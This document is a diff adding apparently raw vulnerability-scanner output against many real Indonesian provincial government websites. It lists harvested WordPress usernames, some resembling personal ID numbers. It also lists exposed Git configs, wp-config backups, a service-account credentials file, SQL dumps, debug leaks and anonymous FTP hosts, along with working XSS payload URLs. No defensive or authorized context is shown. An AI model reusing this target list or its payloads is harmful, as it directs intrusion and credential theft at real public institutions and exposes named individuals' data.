@@ -1,1 +1,151 @@
-here
+[CVE-2017-5487:usernames] [http] [medium] https://adbang.papuabaratprov.go.id/wp-json/wp/v2/users/ ["adbang"]
+[CVE-2017-5487:usernames] [http] [medium] https://adpim.papuabaratprov.go.id/wp-json/wp/v2/users/ ["adpim"]
+[CVE-2017-5487:usernames] [http] [medium] https://arpus.acehprov.go.id/?rest_route=/wp/v2/users/ ["Cody","Humas Arpus","Zesy Sylfia","athrun","windy","zesy"]
+[CVE-2017-5487:usernames] [http] [medium] https://bakesbangpol.kalselprov.go.id/wp-json/wp/v2/users/ ["Admin_bidpol","nimda_78","bidang_hanseni","bidang_politik","Admin","Admin_bidhanseni"]
+[CVE-2017-5487:usernames] [http] [medium] https://balaipkp.jogjaprov.go.id/wp-json/wp/v2/users/ ["admin"]
+[CVE-2017-5487:usernames] [http] [medium] https://bakohumas.papua.go.id/wp-json/wp/v2/users/ ["RelawanTIK Papua","admin_yx2t4o05","bakohumas-prov-papua","relawantik-papua","teknisi","admin","Bakohumas Papua"]
+[CVE-2017-5487:usernames] [http] [medium] https://bapelkes.kalselprov.go.id/wp-json/wp/v2/users/ ["redaksi","cekdemomyid","Redaksi","Web Admin"]
+[CVE-2017-5487:usernames] [http] [medium] https://bapenda.jabarprov.go.id/wp-json/wp/v2/users/ ["puslia","arrie-sukma","galih-pakuan","Admin","Tim Artikel","Timdata"]
+[CVE-2017-5487:usernames] [http] [medium] https://bapenda.kaltimprov.go.id/wp-json/wp/v2/users/ ["syswebadmin"]
+[CVE-2017-5487:usernames] [http] [medium] https://bappenda.papuabaratprov.go.id/wp-json/wp/v2/users/ ["bappenda"]
+[CVE-2017-5487:usernames] [http] [medium] https://berita.gorontaloprov.go.id/wp-json/wp/v2/users/ ["echin","haris","Admin","Asriani","Burhanudin Enggoa","habari","asriani","burhanudin","Echin Hadji","Haris Radju","Admin Humas","Ismail Sam Giu","mila","Bahrian s. Umamah","Mersin Haji","bahrian","isam","gina-rahman","adminhumas","mersin"]
+[CVE-2017-5487:usernames] [http] [medium] https://birobangda.bengkuluprov.go.id/wp-json/wp/v2/users/ ["admin_bangda"]
+[CVE-2017-5487:usernames] [http] [medium] https://birohukum.papuabaratprov.go.id/wp-json/wp/v2/users/ ["birohukum"]
+[CVE-2017-5487:usernames] [http] [medium] https://biroekonomi.papuabaratprov.go.id/wp-json/wp/v2/users/ ["biroekonomi"]
+[CVE-2017-5487:usernames] [http] [medium] https://biroekosda.bengkuluprov.go.id/wp-json/wp/v2/users/ ["biroekosda_admin"]
+[CVE-2017-5487:usernames] [http] [medium] https://birokesra.kalselprov.go.id/wp-json/wp/v2/users/ ["birokesra","Birokesra"]
+[CVE-2017-5487:usernames] [http] [medium] https://biroorganisasi.bengkuluprov.go.id/wp-json/wp/v2/users/ ["biroorganisasi_admin01","Biro Organisasi"]
+[CVE-2017-5487:usernames] [http] [medium] https://biroorganisasi.papuabaratprov.go.id/wp-json/wp/v2/users/ ["biroorganisasi"]
+[CVE-2017-5487:usernames] [http] [medium] https://biropem.papuabaratprov.go.id/wp-json/wp/v2/users/ ["biropem"]
+[CVE-2017-5487:usernames] [http] [medium] https://biroperekonomian.jogjaprov.go.id/wp-json/wp/v2/users/ ["3404051711900001","manager","199105062020121015","196601091996032001","Briyan Heru","susanti-se1gmail-com","R. Ardyanto Bowo Laksono","Susanti -","Suwarsih"]
+[CVE-2017-5487:usernames] [http] [medium] https://biropbj.kalselprov.go.id/wp-json/wp/v2/users/ ["admin"]
+[CVE-2017-5487:usernames] [http] [medium] https://biroumum.papuabaratprov.go.id/wp-json/wp/v2/users/ ["biroumum"]
+[CVE-2017-5487:usernames] [http] [medium] https://biroumum.bengkuluprov.go.id/wp-json/wp/v2/users/ ["biroumum_webadmin01","tim birum"]
+[CVE-2017-5487:usernames] [http] [medium] https://bkd.kaltaraprov.go.id/wp-json/wp/v2/users/ ["bkdadmin"]
+[CVE-2017-5487:usernames] [http] [medium] https://bpbd.kalselprov.go.id/wp-json/wp/v2/users/ ["bpbdkalsel"]
+[CVE-2017-5487:usernames] [http] [medium] https://bplp.papuabaratprov.go.id/wp-json/wp/v2/users/ ["bplp"]
+[CVE-2017-5487:usernames] [http] [medium] https://bpkad.papuabaratprov.go.id/wp-json/wp/v2/users/ ["bpkad"]
+[CVE-2017-5487:usernames] [http] [medium] https://bptpb.jogjaprov.go.id/wp-json/wp/v2/users/ ["admin","krisna"]
+[CVE-2017-5487:usernames] [http] [medium] https://bpmhp.kalselprov.go.id/?rest_route=/wp/v2/users/ ["super-admin","admin"]
+[CVE-2017-5487:usernames] [http] [medium] https://bpsdm.kaltaraprov.go.id/?rest_route=/wp/v2/users/ ["admin-bpsdm","admin bpsdm"]
+[CVE-2017-5487:usernames] [http] [medium] https://citarumharum.jabarprov.go.id/wp-json/wp/v2/users/ ["sysadmin","bagus-rachman","Administrator","Bagus Rachman"]
+[CVE-2017-5487:usernames] [http] [medium] https://cobattu.nttprov.go.id/wp-json/wp/v2/users/ ["Rs Kartini","rs-kartini"]
+[CVE-2017-5487:usernames] [http] [medium] https://covid19.papuabaratprov.go.id/wp-json/wp/v2/users/ ["covid19"]
+[CVE-2017-5487:usernames] [http] [medium] https://dinaslh.kaltimprov.go.id/wp-json/wp/v2/users/ ["dlhkltim","Dinas Lingkungan Hidup"]
+[CVE-2017-5487:usernames] [http] [medium] https://dinkopukm.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dinkopukm"]
+[CVE-2017-5487:usernames] [http] [medium] https://dinnakkeswan.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dinnakkeswan"]
+[CVE-2017-5487:usernames] [http] [medium] https://dinaspmd.sumutprov.go.id/wp-json/wp/v2/users/ ["admindispmd","dinaspmd","Dinas PMDCapil Provsu"]
+[CVE-2017-5487:usernames] [http] [medium] https://dinsos.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dinsos"]
+[CVE-2017-5487:usernames] [http] [medium] https://disbudpar.papuabaratprov.go.id/wp-json/wp/v2/users/ ["disbudpar"]
+[CVE-2017-5487:usernames] [http] [medium] http://disbudpar.sumutprov.go.id/wp-json/wp/v2/users/ ["bidangbinaobjek","bidangpemasaran","bidangsenibudaya","disbudpar","disbudparsumut","bidangsejarah","sekretariat","SEJARAH KEPURBAKALAAN"]
+[CVE-2017-5487:usernames] [http] [medium] https://disdik.kalteng.go.id/wp-json/wp/v2/users/ ["usernews2","userdisdik4","Pengelola Web 2 Disdik","user news","User News","usernews1","Olphy Octaria","admin","userdisdik2","pengelola","olphy","userdisdik1","Pengelola Web Disdik 1","userdisdik4 disdik kalteng"]
+[CVE-2017-5487:usernames] [http] [medium] https://disdik.papuabaratprov.go.id/wp-json/wp/v2/users/ ["disdik"]
+[CVE-2017-5487:usernames] [http] [medium] https://dishub.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dishub"]
+[CVE-2017-5487:usernames] [http] [medium] https://dinkesdukcapil.nttprov.go.id/?rest_route=/wp/v2/users/ ["admin"]
+[CVE-2017-5487:usernames] [http] [medium] https://dishub.sumutprov.go.id/wp-json/wp/v2/users/ ["dishubsu","admindeski","dishub-provsu","dishub","deski helsa pane","Dishub Provsu"]
+[CVE-2017-5487:usernames] [http] [medium] https://dishut.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dishut"]
+[CVE-2017-5487:usernames] [http] [medium] https://diskepang.papuabaratprov.go.id/wp-json/wp/v2/users/ ["diskepang"]
+[CVE-2017-5487:usernames] [http] [medium] https://diskominfo.kalselprov.go.id/wp-json/wp/v2/users/ ["Byan Aris Mulyazie","Raden Aden","Selvia Abdie","adelin-yuanita","adel mc","gianino23","aden","selvia","Agustian Arie S","agustian","byan"]
+[CVE-2017-5487:usernames] [http] [medium] https://diskominfomc.kalselprov.go.id/wp-json/wp/v2/users/ ["Adelin","Arief RH","Yasinta","adelin-yuanita","arief","mckalsel","yasinta"]
+[CVE-2017-5487:usernames] [http] [medium] https://dislautkan.kalselprov.go.id/wp-json/wp/v2/users/ ["admin"]
+[CVE-2017-5487:usernames] [http] [medium] https://disperindag.papuabaratprov.go.id/wp-json/wp/v2/users/ ["disperindag"]
+[CVE-2017-5487:usernames] [http] [medium] https://dispora.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dispora"]
+[CVE-2017-5487:usernames] [http] [medium] https://dispppa.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dispppa"]
+[CVE-2017-5487:usernames] [http] [medium] https://disperindag.malutprov.go.id/?rest_route=/wp/v2/users/ ["Profil Disperindag","admin","admin-1","Admin"]
+[CVE-2017-5487:usernames] [http] [medium] https://dispora.acehprov.go.id/?rest_route=/wp/v2/users/ ["adiw","dbpora","adminpora","kusnandar","Adi Warsidi","Administrator","Kusnandar ZET"]
+[CVE-2017-5487:usernames] [http] [medium] https://dkp.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dkp"]
+[CVE-2017-5487:usernames] [http] [medium] https://dlht.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dlht"]
+[CVE-2017-5487:usernames] [http] [medium] https://dlhk.jogjaprov.go.id/wp-json/wp/v2/users/ ["dlhk"]
+[CVE-2017-5487:usernames] [http] [medium] https://dpmk.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dpmk"]
+[CVE-2017-5487:usernames] [http] [medium] https://disperindag.papua.go.id/?rest_route=/wp/v2/users/ ["admin"]
+[CVE-2017-5487:usernames] [http] [medium] https://dpr.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dpr"]
+[CVE-2017-5487:usernames] [http] [medium] https://dpupesdm.jogjaprov.go.id/wp-json/wp/v2/users/ ["dpupesdm"]
+[CVE-2017-5487:usernames] [http] [medium] https://dtphp.papuabaratprov.go.id/wp-json/wp/v2/users/ ["dtphp"]
+[CVE-2019-12616] [http] [medium] http://andesit.esdm.jatengprov.go.id/phpmyadmin/ ["4.8.5"]
+[CVE-2019-12616] [http] [medium] https://arin.bengkuluprov.go.id/phpmyadmin/ ["4.7.4"]
+[CVE-2019-12616] [http] [medium] https://aps.bengkuluprov.go.id/phpmyadmin/ ["4.7.4"]
+[CVE-2019-12616] [http] [medium] https://bartim.umkm.kalteng.go.id/phpmyadmin/ ["4.5.4.1"]
+[CVE-2019-12616] [http] [medium] https://barsel.umkm.kalteng.go.id/phpmyadmin/ ["4.5.4.1"]
+[CVE-2019-12616] [http] [medium] https://barut.umkm.kalteng.go.id/phpmyadmin/ ["4.5.4.1"]
+[CVE-2019-12616] [http] [medium] https://citarumharum.jabarprov.go.id/phpmyadmin/ ["4.5.4.1"]
+[CVE-2019-12616] [http] [medium] https://csirt.papuabaratprov.go.id/phpmyadmin/ ["4.6.6"]
+[CVE-2019-12616] [http] [medium] http://dekranasda.sumutprov.go.id/phpmyadmin/ ["4.8.5"]
+[CVE-2019-12616] [http] [medium] https://datakubaik.transnaker.papuabaratprov.go.id/phpmyadmin/ ["4.6.6"]
+[CVE-2019-12616] [http] [medium] https://dinastphp.kalteng.go.id/phpmyadmin/ ["4.5.4.1"]
+[CVE-2019-12616] [http] [medium] https://diskominfomc.kalselprov.go.id/phpmyadmin/ ["4.6.6"]
+[CVE-2019-12616] [http] [medium] https://dlh.kalteng.go.id/phpmyadmin/ ["4.5.4.1"]
+[CVE-2019-12616] [http] [medium] https://dpmptsp.bengkuluprov.go.id/phpmyadmin/ ["4.7.4"]
+[CVE-2021-25118] [http] [medium] https://bakohumas.papua.go.id/wp-json/wp/v2/posts?per_page=1 ["\\/home\\/bakohumaspapuago\\/public_html\\"]
+[CVE-2021-38314] [http] [medium] https://bakohumas.papua.go.id/wp-admin/admin-ajax.php?action=7d34a4b93336556616f033fe5c826ac2 ["b54cbb975d7784a2049a6d46699550fe"]
+[CVE-2021-38314] [http] [medium] https://birokesra.kalselprov.go.id/wp-admin/admin-ajax.php?action=18d414c34477d335db85e30475166b15 ["bab623cbabd0e0171288cdef628c99de"]
+[CVE-2021-38314] [http] [medium] https://disperkimtan.kalteng.go.id/wp-admin/admin-ajax.php?action=24975fbffbe53581c274a40a03e1a4ca ["a63b1e78e68c51dd1654b1e18589ddb0"]
+[CVE-2021-39327] [http] [medium] https://disdik.kalteng.go.id/wp-content/plugins/bulletproof-security/admin/htaccess/db_backup_log.txt
+[CVE-2022-1724] [http] [medium] https://agricenter.jogjaprov.go.id/wp-admin/admin-ajax.php?action=swpm_validate_email&fieldId=%22%3Cscript%3Ealert(document.domain)%3C/script%3E
+[CVE-2022-29455] [http] [medium] https://bapelkes.kalselprov.go.id/wp-content/plugins/elementor/readme.txt ["3.4.8"]
+[CVE-2022-2627] [http] [medium] https://dinkes.papua.go.id/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2 [xss_payload="<form><math><img+onerror=alert(document.domain)+src=1><mtext></form>"]
+[CVE-2022-2627] [http] [medium] https://disperkimtan.kalteng.go.id/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2 [xss_payload="<form><math><img+onerror=alert(document.domain)+src=1><mtext></form>"]
+[CVE-2022-2627] [http] [medium] https://disperindag.malutprov.go.id/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2 [xss_payload="<form><math><img+onerror=alert(document.domain)+src=1><mtext></form>"]
+[CVE-2023-2813] [http] [medium] https://bappeda.jatimprov.go.id/?s=ph7fCh%3CIMG%20%22%22%22%3E%3CIMG%20SRC=/%20onerror=%22alert(document.domain)%22%3E%3C/img%3E/1oh/
+[cgi-printenv] [http] [medium] https://bppkad.nttprov.go.id/cgi-bin/printenv.pl
+[cgi-printenv] [http] [medium] https://dapodik.disdik.jabarprov.go.id/cgi-bin/printenv.pl
+[configuration-listing] [http] [medium] https://disnakkeswan.papua.go.id/config/
+[git-config] [http] [medium] http://andesit.esdm.jatengprov.go.id/.git/config
+[git-config] [http] [medium] https://akurasi-rsudainun.gorontaloprov.go.id/.git/config
+[git-config] [http] [medium] https://bpbj.kaltaraprov.go.id/.git/config
+[git-config] [http] [medium] https://dashboard.kalteng.go.id/.git/config
+[git-config] [http] [medium] https://disdikbud.kalselprov.go.id/.git/config
+[git-config] [http] [medium] https://dispursip.kalteng.go.id/.git/config
+[service-account-credentials] [http] [medium] https://bpkad.jatimprov.go.id/service-account-credentials.json
+[joomla-manifest-file] [http] [medium] https://bappedalitbang.kaltaraprov.go.id/administrator/manifests/files/joomla.xml
+[joomla-manifest-file] [http] [medium] https://blk.papua.go.id/administrator/manifests/files/joomla.xml
+[joomla-manifest-file] [http] [medium] https://dinkes.kepriprov.go.id/administrator/manifests/files/joomla.xml
+[roundcube-log-disclosure] [http] [medium] https://bpsdm.kaltaraprov.go.id/webmail/logs/errors ["187585"] [roundcube_path="webmail/logs/errors"]
+[laravel-debug-enabled] [http] [medium] https://api.kaltimprov.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://api.kelas.pdk.jatengprov.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://api.simpel.pdk.jatengprov.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://api.wahana.pdk.jatengprov.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://bapenda.jatimprov.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://bappeda.kaltimprov.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://barat.jakarta.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://birokesra.kaltimprov.go.id/_ignition/health-check
+[laravel-debug-infoleak] [http] [medium] https://aspirasi.kaltimprov.go.id/
+[laravel-debug-infoleak] [http] [medium] https://audiy.jogjaprov.go.id/
+[laravel-debug-infoleak] [http] [medium] https://bankeu.kaltimprov.go.id/
+[laravel-debug-enabled] [http] [medium] https://bpjk.jogjaprov.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://bpsdm.jakarta.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://bpsdm.sumutprov.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://btikp.sumselprov.go.id/_ignition/health-check
+[laravel-debug-infoleak] [http] [medium] https://corona.kalteng.go.id/
+[laravel-debug-enabled] [http] [medium] https://csirt.acehprov.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://datakubaik.transnaker.papuabaratprov.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://dishut.kaltimprov.go.id/_ignition/health-check
+[laravel-debug-enabled] [http] [medium] https://dpupr.kaltimprov.go.id/_ignition/health-check
+[php-debugbar-exposure] [http] [medium] https://birokesra.kaltimprov.go.id
+[sound4-directory-listing] [http] [medium] https://absensi.papua.go.id/log/
+[ssrf-via-oauth-misconfig] [http] [medium] https://abnon-disparekraf.jakarta.go.id/connect/register
+[ssrf-via-oauth-misconfig] [http] [medium] https://abnon-disparekraf.jakarta.go.id/connect/register
+[ssrf-via-oauth-misconfig] [http] [medium] https://absensipkmpg.jakarta.go.id/connect/register
+[ssrf-via-oauth-misconfig] [http] [medium] https://akundlh.jakarta.go.id/connect/register
+[ssrf-via-oauth-misconfig] [http] [medium] https://akundlh.jakarta.go.id/connect/register
+[ssrf-via-oauth-misconfig] [http] [medium] https://alihmedia-dpmptsp.jakarta.go.id/connect/register
+[default-sql-dump] [http] [medium] https://dinaspmd.sumutprov.go.id/mysql.sql
+[ssrf-via-oauth-misconfig] [http] [medium] https://disparekraf.jakarta.go.id/connect/register
+[ssrf-via-oauth-misconfig] [http] [medium] https://disparekraf.jakarta.go.id/connect/register
+[roundcube-log-disclosure] [http] [medium] https://cpanel.tnde.jatengprov.go.id/roundcube/logs/errors.log ["1000"] [roundcube_path="roundcube/logs/errors.log"]
+[roundcube-log-disclosure] [http] [medium] https://cpanel.tnde.jatengprov.go.id/webmail/logs/errors.log ["1000"] [roundcube_path="webmail/logs/errors.log"]
+[slims-xss] [http] [medium] http://ebook.pustaka.sumbarprov.go.id/index.php?_csrf_token_645a83a41868941e4692aa31e7235f2=6a50886006f02202a6dac5cfa07bcbfb1e2a6e84&destination=zbuip%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ejgoihbmmygljgoihbmmygl&logMeIn=Login&memberID=admin&memberPassWord=password&p=member
+[music-store-open-redirect] [http] [medium] https://csirt.kalselprov.go.id/wp-content/plugins/music-store/ms-core/ms-submit.php
+[music-store-open-redirect] [http] [medium] https://csirt.kaltaraprov.go.id/wp-content/plugins/music-store/ms-core/ms-submit.php
+[music-store-open-redirect] [http] [medium] https://csirt.malukuprov.go.id/wp-content/plugins/music-store/ms-core/ms-submit.php
+[music-store-open-redirect] [http] [medium] https://csirt.acehprov.go.id/wp-content/plugins/music-store/ms-core/ms-submit.php
+[wpdm-cache-session] [http] [medium] https://bappeda.kalselprov.go.id/wp-content/uploads/wpdm-cache/
+[wpdm-cache-session] [http] [medium] https://dinkes.papua.go.id/wp-content/uploads/wpdm-cache/
+[ssh-weak-algo-supported] [javascript] [medium] biroumum.jogjaprov.go.id:22
+[phpmyadmin-setup] [http] [medium] https://dlh.kalteng.go.id/phpmyadmin/setup/index.php
+[ssh-weak-algo-supported] [javascript] [medium] dinaspmd.sumutprov.go.id:22
+[smb-signing-not-required] [javascript] [medium] bppkad.nttprov.go.id:445
+[ftp-anonymous-login] [tcp] [medium] bpsdm.kaltaraprov.go.id:21
+[ftp-anonymous-login] [tcp] [medium] cpanel.tnde.jatengprov.go.id:21
+[ftp-anonymous-login] [tcp] [medium] disnak.sumbarprov.go.id:21
+[wordpress-accessible-wpconfig] [http] [medium] https://diskopukm.jogjaprov.go.id/wp-config.php.bak
+[wordpress-accessible-wpconfig] [http] [medium] https://disnakeresdm.baliprov.go.id/wp-config.php.save
